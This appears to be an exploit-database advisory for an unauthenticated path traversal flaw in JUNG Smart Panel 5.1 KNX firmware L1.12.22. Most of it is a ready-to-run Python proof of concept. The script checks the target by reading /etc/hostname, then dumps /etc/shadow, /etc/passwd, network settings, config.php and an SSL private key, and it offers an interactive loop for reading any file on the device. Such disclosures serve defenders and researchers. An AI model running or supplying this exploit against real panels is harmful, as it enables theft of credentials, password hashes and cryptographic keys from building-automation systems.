@@ -1,0 +1,144 @@
+=============================================================================================================================================
+| # Title     : JUNG Smart Panel 5.1 KNX (L1.12.22) – Unauthenticated File Path Traversal                                                   |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.jung-group.com/en-DE                                                                                            |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/215430/  & 	ZSL-2026-5969
+
+[+] Summary    : An unauthenticated file path traversal vulnerability has been identified in JUNG Smart Panel 5.1 KNX firmware version L1.12.22, developed by ALBRECHT JUNG GMBH & CO. KG.
+                 The flaw allows remote attackers to read arbitrary files from the underlying operating system without authentication. By crafting a specially formed HTTP request 
+				 containing manipulated file paths, an attacker can retrieve sensitive system files such as configuration files, credential stores, network settings, and cryptographic material.
+
+[+] Successful exploitation may result in:
+
+Disclosure of system user accounts
+
+Exposure of password hashes
+
+Leakage of SSL private keys
+
+Exposure of application configuration files
+
+Further privilege escalation or lateral movement
+
+The vulnerability does not require valid credentials and can be exploited remotely over HTTP, significantly increasing its impact in exposed environments.
+
+CVE ID: CVE-2026-25872
+Affected Version: L1.12.22
+Impact: Confidentiality compromise
+Attack Vector: Remote (Unauthenticated)
+Severity: High / Critical (depending on deployment exposure)
+
+[+] POC :
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class JUNGSmartPanelExploit:
+    def __init__(self, target_ip):
+        self.target_ip = target_ip
+        self.base_url = f"http://{target_ip}"
+        self.session = requests.Session()
+        
+    def read_file(self, file_path):
+        """
+        Read arbitrary files from the target system
+        Example: /etc/shadow, /etc/passwd, /etc/hostname
+        """
+        try:
+
+            url = f"{self.base_url}//{file_path.lstrip('/')}"
+            
+            response = self.session.get(
+                url,
+                timeout=10,
+                verify=False,
+                allow_redirects=False
+            )
+            
+            if response.status_code == 200 and response.text:
+                return response.text
+            else:
+                return f"[!] Failed to read {file_path} (Status: {response.status_code})"
+                
+        except Exception as e:
+            return f"[!] Error: {str(e)}"
+    
+    def exploit(self):
+        """Main exploitation function"""
+        print(f"\n[*] Targeting JUNG Smart Panel at {self.target_ip}")
+        print("[*] Checking vulnerability...")
+
+        test_file = "/etc/hostname"
+        result = self.read_file(test_file)
+        
+        if "Failed" not in result and "Error" not in result:
+            print("[+] Target is VULNERABLE!")
+            print(f"[+] Successfully read {test_file}:")
+            print("-" * 50)
+            print(result.strip())
+            print("-" * 50)
+            return True
+        else:
+            print("[-] Target may not be vulnerable or is unreachable")
+            return False
+    
+    def dump_sensitive_files(self):
+        """Dump common sensitive files"""
+        sensitive_files = [
+            "/etc/shadow",
+            "/etc/passwd",
+            "/etc/hostname",
+            "/etc/network/interfaces",
+            "/etc/hosts",
+            "/proc/version",
+            "/proc/cpuinfo",
+            "/var/www/html/config.php",
+            "/etc/ssl/private/ssl-cert-snakeoil.key"
+        ]
+        
+        print("\n[*] Dumping sensitive files...")
+        for file_path in sensitive_files:
+            print(f"\n[>] Reading: {file_path}")
+            print("-" * 40)
+            content = self.read_file(file_path)
+            print(content[:200] + "..." if len(content) > 200 else content)
+            print("-" * 40)
+
+def main():
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <target_ip>")
+        print(f"Example: {sys.argv[0]} 17.17.17.17")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    exploit = JUNGSmartPanelExploit(target)
+    
+    if exploit.exploit():
+        print("\n[*] Interactive mode - Enter file paths to read (or 'quit'):")
+        while True:
+            file_path = input("\n[?] File path (e.g., /etc/shadow): ").strip()
+            if file_path.lower() == 'quit':
+                break
+            if file_path:
+                content = exploit.read_file(file_path)
+                print(content)
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("JUNG Smart Panel 5.1 KNX File Disclosure Exploit")
+    print("ZSL-2026-5969 | CVE-2026-25872")
+    print("=" * 60)
+    main()
+	
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
